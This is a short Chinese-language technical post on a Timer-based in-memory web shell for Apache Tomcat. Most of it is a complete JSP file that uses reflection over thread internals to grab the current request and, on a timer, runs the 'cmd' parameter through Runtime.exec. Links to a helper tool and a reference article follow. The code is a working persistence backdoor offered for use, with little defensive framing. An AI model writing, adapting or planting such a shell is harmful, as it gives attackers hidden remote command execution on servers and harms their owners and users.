# Timer型内存马

## 思路原理

创建了一个 Timer 计时器对象，然后使用 `schedule` 方法创建了一个 TimerTask 对象，也就是说创建了一个定时任务，每隔 1000 ms，就执行一次 `java.util.TimerTask#run` 方法里面的逻辑

## 实现代码

下面获取request的自己配合工具去根据自己对应Tomcat的版本运行获得，工具在配合工具栏

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Iterator" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--TargetObject = {org.apache.tomcat.util.threads.TaskThread}--%>
<%-----> group = {java.lang.ThreadGroup}--%>
<%-----> threads = {class [Ljava.lang.Thread;}--%>
<%-----> [4] = {java.lang.Thread}--%>
<%-----> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}--%>
<%-----> this$0 = {org.apache.tomcat.util.net.NioEndpoint}--%>
<%-----> connections = {java.util.Map<U, org.apache.tomcat.util.net.SocketWrapperBase<S>>}--%>
<%-----> [java.nio.channels.SocketChannel[connected local=/127.0.0.1:8080 remote=/127.0.0.1:57372]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper}--%>
<%-----> currentProcessor = {org.apache.coyote.http11.Http11Processor}--%>
<%-----> request = {org.apache.coyote.Request}--%>
<%-----> notes = {class [Ljava.lang.Object;}--%>
<%!
    private static Object getField(Object object, String fieldName) throws Exception {
        Field field = null;
        Class clazz = object.getClass();

        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }

        if (field == null) {
            throw new NoSuchFieldException(fieldName);
        } else {
            field.setAccessible(true);
            return field.get(object);
        }
    }

    private static Request getRequest() throws Exception {
        Object obj = Thread.currentThread();
        obj = getField(getField(obj,"group"),"threads");
        Thread[] threads = (Thread[]) obj;
        Thread thread = threads[4];
        Object target = getField(thread, "target");
        java.util.concurrent.ConcurrentHashMap map = (java.util.concurrent.ConcurrentHashMap)getField(getField(target, "this$0"), "connections");
        Iterator iterator = map.keySet().iterator();
        while (iterator.hasNext()) {
            Object key = iterator.next();
            Object val = map.get(key);
            try {
                org.apache.coyote.Request rq = (org.apache.coyote.Request) getField(getField(val, "currentProcessor"), "request");
                Object[] notes = (Object[]) getField(rq, "notes");
                Request rqq = (Request) notes[1];
                return rqq;
            } catch (Exception e) {

            }
        }
        return null;

    }
%>
<%

    java.util.Timer executeSchedule = new java.util.Timer();
    executeSchedule.schedule(new java.util.TimerTask() {
        public void run() {
            try {
                Runtime.getRuntime().exec(getRequest().getParameter("cmd"));
            } catch (Exception e) {

            }
        }
    }, 0, 100);

%>
```



## 配合工具

对象搜索工具简直爱的不要不要的

https://github.com/c0ny1/java-object-searcher



## 参考文章

https://www.javaweb.org/?p=544
